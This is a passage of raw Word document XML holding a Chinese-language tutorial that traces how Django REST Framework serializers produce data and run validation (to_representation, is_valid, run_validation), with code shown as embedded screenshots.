          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>属性，下次再调用</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函数的时候，就直接返回了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>self._data</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD395C8"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进入</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>语句中，只要</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>没有错误属性，且</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>instance</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>不为空或者有</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_validated_data</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>属性，都会执行一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.to_representation</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的方法，只是传的参数不同。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5226137D"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__init__()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C689BD" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002A1F3B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="05BEA989" wp14:editId="7E7AB0BA">
            <wp:extent cx="7766472" cy="1897380"/>
            <wp:effectExtent l="0" t="0" r="6350" b="7620"/>
            <wp:docPr id="30" name="图片 30">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78420" cy="1900299"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="709EDDA4"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当我们序列化一个数据对象的时候，一般是直接位置传参，数据对象被参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>instance</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>接收，这个时候</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>instance</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>不为空，我们再看</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>BaseSerializer</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方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A9CF72"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data()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22880D6D"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43DAC61B" wp14:editId="3AEEE16F">
            <wp:extent cx="8020050" cy="3093720"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31" name="图片 3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48610" cy="3104737"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5877CD3D" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="150" w:after="150"/>
        <w:ind w:firstLineChars="0"/>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Serializer/def to_representation()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0709714F"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2A1F3B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="794B412D" wp14:editId="57106417">
            <wp:extent cx="8235894" cy="2697480"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="32" name="图片 32">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61599" cy="2705899"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="104C9681"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真正进行序列化操作的是</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类重写的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>to_representation</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法，它将每一个字段都进行了字段自己的校验，然后放入</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>OrderDict</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>有序字典中，再将有序字典返回。这个有序字典在</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def data</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法中用</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ReturnDict</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>加工之后，就是最后的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>serializer_obj.data</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>返回对象了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65368C2E" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="500" w:lineRule="exact"/>
        <w:ind w:firstLineChars="0"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:rtl/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="5D69A5"/>
          <w:kern w:val="36"/>
          <w:sz w:val="47"/>
          <w:szCs w:val="47"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="36"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>五、Serializer校验相关</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78ACBF30"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我们先大概看一些反序列化的过程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162F85A8" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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__init__()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38274331"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2ADCB33A" wp14:editId="6FD48EFC">
            <wp:extent cx="6416675" cy="2133600"/>
            <wp:effectExtent l="0" t="0" r="3175" b="0"/>
            <wp:docPr id="33" name="图片 33">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30398" cy="2138163"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="55497B60" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="4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可以看到，序列化组件对象把传入的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直接赋值给了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>self</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initial_data</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>属性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0F0423" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:line="40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序列化入口</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> rest_framework/serializes.py/class BaseSerializer/def is_valid()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1EB2FD"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2A1F3B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="487E4E5C" wp14:editId="30910028">
            <wp:extent cx="8003177" cy="3777615"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="34" name="图片 34">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29345" cy="3789967"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC592E9" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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这里也是用了一种类似单例的模式，避免了重复校验，校验后的结果存放在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>self</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_validated_data</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>属性当中，生成校验后结果的函数是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>run_validation()</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>，捕获异常，并把异常放在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>self._error</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>当中，如果</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_error</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>不为空且</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>raise_exception</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为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>True</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>时，会直接抛异常。最后返回一个</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值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A1F05B" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="150" w:after="150"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rest_framework/serializes.py/class Serializer/def run_validation()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478E8257"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2A1F3B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="45BFC51D" wp14:editId="68F9C76B">
            <wp:extent cx="7646035" cy="2639834"/>
            <wp:effectExtent l="0" t="0" r="0" b="8255"/>
            <wp:docPr id="35" name="图片 35">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53013" cy="2642243"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="412B0EAF" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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先调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>to_internal_value</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>返回一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>，再以</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>为参数分别执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>run_validators</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>validate</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法。最后返回的是</w:t>
      </w:r>
